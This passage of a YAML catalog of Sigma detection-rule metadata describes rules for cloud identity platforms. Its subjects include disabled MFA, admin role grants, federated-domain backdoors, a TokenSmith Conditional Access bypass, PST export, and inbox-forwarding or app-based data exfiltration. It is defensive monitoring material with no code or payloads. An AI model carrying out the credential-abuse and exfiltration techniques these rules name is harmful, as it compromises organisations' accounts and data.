  description: Detects when multi-factor authentication (MFA) is disabled.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 7
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: gcp
  product: google_workspace.admin
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques: []
  tags:
  - attack.impact
  time_window: ''
  references:
  - https://cloud.google.com/logging/docs/audit/gsuite-audit-logging#3
  - https://developers.google.com/admin-sdk/reports/v1/appendix/activity/admin-security-settings#ENFORCE_STRONG_AUTHENTICATION
  - https://developers.google.com/admin-sdk/reports/v1/appendix/activity/admin-security-settings?hl=en#ALLOW_STRONG_AUTHENTICATION
  false_positives:
  - MFA may be disabled and performed by a system administrator.
  notes: ''
- detection_id: 6aef64e3-60c6-4782-8db3-8448759c714e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/gcp/gworkspace/gcp_gworkspace_role_modified_or_deleted.yml
  name: Google Workspace Role Modified or Deleted
  description: Detects when an a role is modified or deleted in Google Workspace.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: gcp
  product: google_workspace.admin
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques: []
  tags:
  - attack.impact
  time_window: ''
  references:
  - https://cloud.google.com/logging/docs/audit/gsuite-audit-logging#3
  - https://developers.google.com/admin-sdk/reports/v1/appendix/activity/admin-delegated-admin-settings
  false_positives:
  - Unknown
  notes: ''
- detection_id: bf638ef7-4d2d-44bb-a1dc-a238252e6267
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/gcp/gworkspace/gcp_gworkspace_role_privilege_deleted.yml
  name: Google Workspace Role Privilege Deleted
  description: Detects when an a role privilege is deleted in Google Workspace.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: gcp
  product: google_workspace.admin
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques: []
  tags:
  - attack.impact
  time_window: ''
  references:
  - https://cloud.google.com/logging/docs/audit/gsuite-audit-logging#3
  - https://developers.google.com/admin-sdk/reports/v1/appendix/activity/admin-delegated-admin-settings
  false_positives:
  - Unknown
  notes: ''
- detection_id: 2d1b83e4-17c6-4896-a37b-29140b40a788
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/gcp/gworkspace/gcp_gworkspace_user_granted_admin_privileges.yml
  name: Google Workspace User Granted Admin Privileges
  description: Detects when an Google Workspace user is granted admin privileges.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: gcp
  product: google_workspace.admin
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1098
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1098
  time_window: ''
  references:
  - https://cloud.google.com/logging/docs/audit/gsuite-audit-logging#3
  - https://developers.google.com/admin-sdk/reports/v1/appendix/activity/admin-user-settings#GRANT_ADMIN_PRIVILEGE
  false_positives:
  - Google Workspace admin role privileges, may be modified by system administrators.
  notes: ''
- detection_id: 13f2d3f5-6497-44a7-bf5f-dc13ffafe5dc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/m365/audit/microsoft365_bypass_conditional_access.yml
  name: Azure Login Bypassing Conditional Access Policies
  description: 'Detects a successful login to the Microsoft Intune Company Portal
    which could allow bypassing Conditional Access Policies and InTune device trust
    using a tool like TokenSmith.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: experimental
  platform: m365
  product: audit
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.initial-access
  - attack.defense-evasion
  - attack.t1078
  time_window: ''
  references:
  - https://labs.jumpsec.com/tokensmith-bypassing-intune-compliant-device-conditional-access/
  - https://github.com/JumpsecLabs/TokenSmith
  false_positives:
  - Unknown
  notes: ''
- detection_id: 60de9b57-dc4d-48b9-a6a0-b39e0469f876
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/m365/audit/microsoft365_disabling_mfa.yml
  name: Disabling Multi Factor Authentication
  description: Detects disabling of Multi Factor Authentication.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: high
  status: test
  platform: m365
  product: audit
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1556.006
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.credential-access
  - attack.t1556.006
  time_window: ''
  references:
  - https://research.splunk.com/cloud/c783dd98-c703-4252-9e8a-f19d9f5c949e/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 58f88172-a73d-442b-94c9-95eaed3cbb36
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/m365/audit/microsoft365_new_federated_domain_added_audit.yml
  name: New Federated Domain Added
  description: Detects the addition of a new Federated Domain.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: m365
  product: audit
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1484.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1484.002
  time_window: ''
  references:
  - https://research.splunk.com/cloud/e155876a-6048-11eb-ae93-0242ac130002/
  - https://o365blog.com/post/aadbackdoor/
  false_positives:
  - The creation of a new Federated domain is not necessarily malicious, however these
    events need to be followed closely, as it may indicate federated credential abuse
    or backdoor via federated identities at a similar or different cloud provider.
  notes: ''
- detection_id: 42127bdd-9133-474f-a6f1-97b6c08a4339
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/m365/exchange/microsoft365_new_federated_domain_added_exchange.yml
  name: New Federated Domain Added - Exchange
  description: Detects the addition of a new Federated Domain.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: m365
  product: exchange
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1136.003
  tags:
  - attack.persistence
  - attack.t1136.003
  time_window: ''
  references:
  - https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/wp-m-unc2452-2021-000343-01.pdf
  - https://us-cert.cisa.gov/ncas/alerts/aa21-008a
  - https://www.splunk.com/en_us/blog/security/a-golden-saml-journey-solarwinds-continued.html
  - https://www.sygnia.co/golden-saml-advisory
  - https://o365blog.com/post/aadbackdoor/
  false_positives:
  - The creation of a new Federated domain is not necessarily malicious, however these
    events need to be followed closely, as it may indicate federated credential abuse
    or backdoor via federated identities at a similar or different cloud provider.
  notes: ''
- detection_id: a3501e8e-af9e-43c6-8cd6-9360bdaae498
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/m365/threat_detection/microsoft365_from_susp_ip_addresses.yml
  name: Activity from Suspicious IP Addresses
  description: 'Detects when a Microsoft Cloud App Security reported users were active
    from an IP address identified as risky by Microsoft Threat Intelligence.

    These IP addresses are involved in malicious activities, such as Botnet C&C, and
    may indicate compromised account.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: m365
  product: threat_detection
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1573
  tags:
  - attack.command-and-control
  - attack.t1573
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/defender-cloud-apps/anomaly-detection-policy
  - https://learn.microsoft.com/en-us/defender-cloud-apps/policy-template-reference
  false_positives:
  - Unknown
  notes: ''
- detection_id: 2e669ed8-742e-4fe5-b3c4-5a59b486c2ee
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/m365/threat_management/microsoft365_activity_by_terminated_user.yml
  name: Activity Performed by Terminated User
  description: 'Detects when a Microsoft Cloud App Security reported for users whose
    account were terminated in Azure AD, but still perform activities in other platforms
    such as AWS or Salesforce.

    This is especially relevant for users who use another account to manage resources,
    since these accounts are often not terminated when a user leaves the company.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: m365
  product: threat_management
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques: []
  tags:
  - attack.impact
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/defender-cloud-apps/anomaly-detection-policy
  - https://learn.microsoft.com/en-us/defender-cloud-apps/policy-template-reference
  false_positives:
  - Unknown
  notes: ''
- detection_id: d8b0a4fe-07a8-41be-bd39-b14afa025d95
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/m365/threat_management/microsoft365_activity_from_anonymous_ip_addresses.yml
  name: Activity from Anonymous IP Addresses
  description: Detects when a Microsoft Cloud App Security reported when users were
    active from an IP address that has been identified as an anonymous proxy IP address.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors:
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: m365
  product: threat_management
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1573
  tags:
  - attack.command-and-control
  - attack.t1573
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/defender-cloud-apps/anomaly-detection-policy
  - https://learn.microsoft.com/en-us/defender-cloud-apps/policy-template-reference
  false_positives:
  - User using a VPN or Proxy
  notes: ''
- detection_id: 0f2468a2-5055-4212-a368-7321198ee706
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/m365/threat_management/microsoft365_activity_from_infrequent_country.yml
  name: Activity from Infrequent Country
  description: Detects when a Microsoft Cloud App Security reported when an activity
    occurs from a location that wasn't recently or never visited by any user in the
    organization.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: m365
  product: threat_management
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1573
  tags:
  - attack.command-and-control
  - attack.t1573
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/defender-cloud-apps/anomaly-detection-policy
  - https://learn.microsoft.com/en-us/defender-cloud-apps/policy-template-reference
  false_positives:
  - Unknown
  notes: ''
- detection_id: 2b669496-d215-47d8-bd9a-f4a45bf07cda
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/m365/threat_management/microsoft365_data_exfiltration_to_unsanctioned_app.yml
  name: Data Exfiltration to Unsanctioned Apps
  description: Detects when a Microsoft Cloud App Security reported when a user or
    IP address uses an app that is not sanctioned to perform an activity that resembles
    an attempt to exfiltrate information from your organization.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors:
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: m365
  product: threat_management
  category: ''
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1537
  tags:
  - attack.exfiltration
  - attack.t1537
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/defender-cloud-apps/anomaly-detection-policy
  - https://learn.microsoft.com/en-us/defender-cloud-apps/policy-template-reference
  false_positives:
  - Unknown
  notes: ''
- detection_id: d7eab125-5f94-43df-8710-795b80fa1189
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/m365/threat_management/microsoft365_impossible_travel_activity.yml
  name: Microsoft 365 - Impossible Travel Activity
  description: Detects when a Microsoft Cloud App Security reported a risky sign-in
    attempt due to a login associated with an impossible travel.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: m365
  product: threat_management
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.initial-access
  - attack.t1078
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/defender-cloud-apps/anomaly-detection-policy
  - https://learn.microsoft.com/en-us/defender-cloud-apps/policy-template-reference
  false_positives:
  - Unknown
  notes: ''
- detection_id: c191e2fa-f9d6-4ccf-82af-4f2aba08359f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/m365/threat_management/microsoft365_logon_from_risky_ip_address.yml
  name: Logon from a Risky IP Address
  description: Detects when a Microsoft Cloud App Security reported when a user signs
    into your sanctioned apps from a risky IP address.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors:
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: m365
  product: threat_management
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.initial-access
  - attack.t1078
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/defender-cloud-apps/anomaly-detection-policy
  - https://learn.microsoft.com/en-us/defender-cloud-apps/policy-template-reference
  false_positives:
  - Unknown
  notes: ''
- detection_id: bd132164-884a-48f1-aa2d-c6d646b04c69
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/m365/threat_management/microsoft365_potential_ransomware_activity.yml
  name: Microsoft 365 - Potential Ransomware Activity
  description: Detects when a Microsoft Cloud App Security reported when a user uploads
    files to the cloud that might be infected with ransomware.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: m365
  product: threat_management
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1486
  tags:
  - attack.impact
  - attack.t1486
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/defender-cloud-apps/anomaly-detection-policy
  - https://learn.microsoft.com/en-us/defender-cloud-apps/policy-template-reference
  false_positives:
  - Unknown
  notes: ''
- detection_id: 18b88d08-d73e-4f21-bc25-4b9892a4fdd0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/m365/threat_management/microsoft365_pst_export_alert.yml
  name: PST Export Alert Using eDiscovery Alert
  description: Alert on when a user has performed an eDiscovery search or exported
    a PST file from the search. This PST file usually has sensitive information including
    email body content
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: m365
  product: threat_management
  category: ''
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1114
  tags:
  - attack.collection
  - attack.t1114
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/microsoft-365/compliance/alert-policies?view=o365-worldwide
  false_positives:
  - PST export can be done for legitimate purposes but due to the sensitive nature
    of its content it must be monitored.
  notes: ''
- detection_id: 6897cd82-6664-11ed-9022-0242ac120002
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/m365/threat_management/microsoft365_pst_export_alert_using_new_compliancesearchaction.yml
  name: PST Export Alert Using New-ComplianceSearchAction
  description: Alert when a user has performed an export to a search using 'New-ComplianceSearchAction'
    with the '-Export' flag. This detection will detect PST export even if the 'eDiscovery
    search or exported' alert is disabled in the O365.This rule will apply to ExchangePowerShell
    usage and from the cloud.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: m365
  product: threat_management
  category: ''
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1114
  tags:
  - attack.collection
  - attack.t1114
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/powershell/module/exchange/new-compliancesearchaction?view=exchange-ps
  false_positives:
  - Exporting a PST can be done for legitimate purposes by legitimate sources, but
    due to the sensitive nature of PST content, it must be monitored.
  notes: ''
- detection_id: 6c220477-0b5b-4b25-bb90-66183b4089e8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/m365/threat_management/microsoft365_susp_inbox_forwarding.yml
  name: Suspicious Inbox Forwarding
  description: Detects when a Microsoft Cloud App Security reported suspicious email
    forwarding rules, for example, if a user created an inbox rule that forwards a
    copy of all emails to an external address.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: m365
  product: threat_management
  category: ''
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1020
  tags:
  - attack.exfiltration
  - attack.t1020
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/defender-cloud-apps/anomaly-detection-policy
  - https://learn.microsoft.com/en-us/defender-cloud-apps/policy-template-reference
  false_positives:
  - Unknown
  notes: ''
- detection_id: ee111937-1fe7-40f0-962a-0eb44d57d174
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/m365/threat_management/microsoft365_susp_oauth_app_file_download_activities.yml
  name: Suspicious OAuth App File Download Activities
  description: Detects when a Microsoft Cloud App Security reported when an app downloads
    multiple files from Microsoft SharePoint or Microsoft OneDrive in a manner that
    is unusual for the user.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: m365
  product: threat_management
  category: ''
  data_sources: []
  tactics:
  - Exfiltration
  techniques: []
  tags:
  - attack.exfiltration
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/defender-cloud-apps/anomaly-detection-policy
  - https://learn.microsoft.com/en-us/defender-cloud-apps/policy-template-reference
  false_positives:
  - Unknown
  notes: ''
- detection_id: 78a34b67-3c39-4886-8fb4-61c46dc18ecd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/m365/threat_management/microsoft365_unusual_volume_of_file_deletion.yml
  name: Microsoft 365 - Unusual Volume of File Deletion
  description: Detects when a Microsoft Cloud App Security reported a user has deleted
    a unusual a large volume of files.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: m365
  product: threat_management
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1485
  tags:
  - attack.impact
  - attack.t1485
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/defender-cloud-apps/anomaly-detection-policy
  - https://learn.microsoft.com/en-us/defender-cloud-apps/policy-template-reference
  false_positives:
  - Unknown
  notes: ''
- detection_id: ff246f56-7f24-402a-baca-b86540e3925c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/m365/threat_management/microsoft365_user_restricted_from_sending_email.yml
  name: Microsoft 365 - User Restricted from Sending Email
  description: Detects when a Security Compliance Center reported a user who exceeded
    sending limits of the service policies and because of this has been restricted
    from sending email.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: m365
  product: threat_management
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1199
  tags:
  - attack.initial-access
  - attack.t1199
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/defender-cloud-apps/anomaly-detection-policy
  - https://learn.microsoft.com/en-us/defender-cloud-apps/policy-template-reference
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6f7e1c10-2dc9-4312-adb6-9574ff09a5c8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/identity/cisco_duo/cisco_duo_mfa_bypass_via_bypass_code.yml
  name: Cisco Duo Successful MFA Authentication Via Bypass Code
  description: 'Detects when a successful MFA authentication occurs due to the use
    of a bypass code.

    A bypass code is a temporary passcode created by an administrator for a specific
    user to access a Duo-protected application. These are generally used as "backup
    codes," so that enrolled users who are having problems with their mobile devices
    (e.g., mobile service is disrupted, the device is lost or stolen, etc.) or who
    temporarily can''t use their enrolled devices (on a plane without mobile data
    services) can still access their Duo-protected systems.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: medium
  status: test
  platform: cisco
  product: duo
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.credential-access
  - attack.defense-evasion
  - attack.initial-access
  time_window: ''
  references:
  - https://duo.com/docs/adminapi#logs
  - https://help.duo.com/s/article/6327?language=en_US
  false_positives:
  - Legitimate user that was assigned on purpose to a bypass group
  notes: ''
- detection_id: 9058ca8b-f397-4fd1-a9fa-2b7aad4d6309
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/identity/okta/okta_admin_activity_from_proxy_query.yml
  name: Okta Admin Functions Access Through Proxy
  description: Detects access to Okta admin functions through proxy.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: okta
  product: okta
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.credential-access
  time_window: ''
  references:
  - https://www.beyondtrust.com/blog/entry/okta-support-unit-breach
  - https://dataconomy.com/2023/10/23/okta-data-breach/
  - https://blog.cloudflare.com/how-cloudflare-mitigated-yet-another-okta-compromise/
  false_positives:
  - False positives are expected if administrators access these function through proxy
    legitimatly. Apply additional filters if necessary
  notes: ''
- detection_id: 413d4a81-6c98-4479-9863-014785fd579c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/identity/okta/okta_admin_role_assigned_to_user_or_group.yml
  name: Okta Admin Role Assigned to an User or Group
  description: Detects when an the Administrator role is assigned to an user or group.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: okta
  product: okta
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1098.003
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1098.003
  time_window: ''
  references:
  - https://developer.okta.com/docs/reference/api/system-log/
  - https://developer.okta.com/docs/reference/api/event-types/
  false_positives:
  - Administrator roles could be assigned to users or group by other admin users.
  notes: ''
- detection_id: 139bdd4b-9cd7-49ba-a2f4-744d0a8f5d8c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/identity/okta/okta_admin_role_assignment_created.yml
  name: Okta Admin Role Assignment Created
  description: Detects when a new admin role assignment is created. Which could be
    a sign of privilege escalation or persistence
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: okta
  product: okta
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  time_window: ''
  references:
  - https://developer.okta.com/docs/reference/api/system-log/
  - https://developer.okta.com/docs/reference/api/event-types/
  false_positives:
  - Legitimate creation of a new admin role assignment
  notes: ''
- detection_id: 19951c21-229d-4ccb-8774-b993c3ff3c5c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/identity/okta/okta_api_token_created.yml
  name: Okta API Token Created
  description: Detects when a API token is created
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: okta
  product: okta
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  time_window: ''
  references:
  - https://developer.okta.com/docs/reference/api/system-log/
  - https://developer.okta.com/docs/reference/api/event-types/
  false_positives:
  - Legitimate creation of an API token by authorized users
  notes: ''
- detection_id: cf1dbc6b-6205-41b4-9b88-a83980d2255b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/identity/okta/okta_api_token_revoked.yml
  name: Okta API Token Revoked
  description: Detects when a API Token is revoked.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: okta
  product: okta
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques: []
  tags:
  - attack.impact
  time_window: ''
  references:
  - https://developer.okta.com/docs/reference/api/system-log/
  - https://developer.okta.com/docs/reference/api/event-types/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7899144b-e416-4c28-b0b5-ab8f9e0a541d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/identity/okta/okta_application_modified_or_deleted.yml
  name: Okta Application Modified or Deleted
  description: Detects when an application is modified or deleted.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: okta
  product: okta
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques: []
  tags:
  - attack.impact
  time_window: ''
  references:
  - https://developer.okta.com/docs/reference/api/system-log/
  - https://developer.okta.com/docs/reference/api/event-types/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 8f668cc4-c18e-45fe-ad00-624a981cf88a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/identity/okta/okta_application_sign_on_policy_modified_or_deleted.yml
  name: Okta Application Sign-On Policy Modified or Deleted
  description: Detects when an application Sign-on Policy is modified or deleted.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: okta
  product: okta
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques: []
  tags:
  - attack.impact
  time_window: ''
  references:
  - https://developer.okta.com/docs/reference/api/system-log/
  - https://developer.okta.com/docs/reference/api/event-types/
  false_positives:
  - Unknown
  notes: ''
- detection_id: ee39a9f7-5a79-4b0a-9815-d36b3cf28d3e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/identity/okta/okta_fastpass_phishing_detection.yml
  name: Okta FastPass Phishing Detection
  description: Detects when Okta FastPass prevents a known phishing site.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: high
  status: test
  platform: okta
  product: okta
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1566
  tags:
  - attack.initial-access
  - attack.t1566
  time_window: ''
  references:
  - https://sec.okta.com/fastpassphishingdetection
  - https://developer.okta.com/docs/reference/api/system-log/
  - https://developer.okta.com/docs/reference/api/event-types/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 969c7590-8c19-4797-8c1b-23155de6e7ac
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/identity/okta/okta_identity_provider_created.yml
  name: Okta Identity Provider Created
  description: Detects when a new identity provider is created for Okta.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: okta
  product: okta
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1098.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1098.001
  time_window: ''
  references:
  - https://developer.okta.com/docs/reference/api/system-log/
  - https://sec.okta.com/articles/2023/08/cross-tenant-impersonation-prevention-and-detection
  false_positives:
  - When an admin creates a new, authorised identity provider.
  notes: ''
- detection_id: 50e068d7-1e6b-4054-87e5-0a592c40c7e0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/identity/okta/okta_mfa_reset_or_deactivated.yml
  name: Okta MFA Reset or Deactivated
  description: Detects when an attempt at deactivating  or resetting MFA.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: okta
  product: okta
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1556.006
  tags:
  - attack.persistence
  - attack.credential-access
  - attack.defense-evasion
  - attack.t1556.006
  time_window: ''
  references:
  - https://developer.okta.com/docs/reference/api/system-log/
  - https://developer.okta.com/docs/reference/api/event-types/
  false_positives:
  - If a MFA reset or deactivated was performed by a system administrator.
  notes: ''
- detection_id: 9f308120-69ed-4506-abde-ac6da81f4310
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/identity/okta/okta_network_zone_deactivated_or_deleted.yml
  name: Okta Network Zone Deactivated or Deleted
  description: Detects when an Network Zone is Deactivated or Deleted.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: okta
  product: okta
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques: []
  tags:
  - attack.impact
  time_window: ''
  references:
  - https://developer.okta.com/docs/reference/api/system-log/
  - https://developer.okta.com/docs/reference/api/event-types/
  false_positives:
  - Unknown
  notes: ''
- detection_id: a0b38b70-3cb5-484b-a4eb-c4d8e7bcc0a9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/identity/okta/okta_new_behaviours_admin_console.yml
  name: Okta New Admin Console Behaviours
  description: Detects when Okta identifies new activity in the Admin Console.
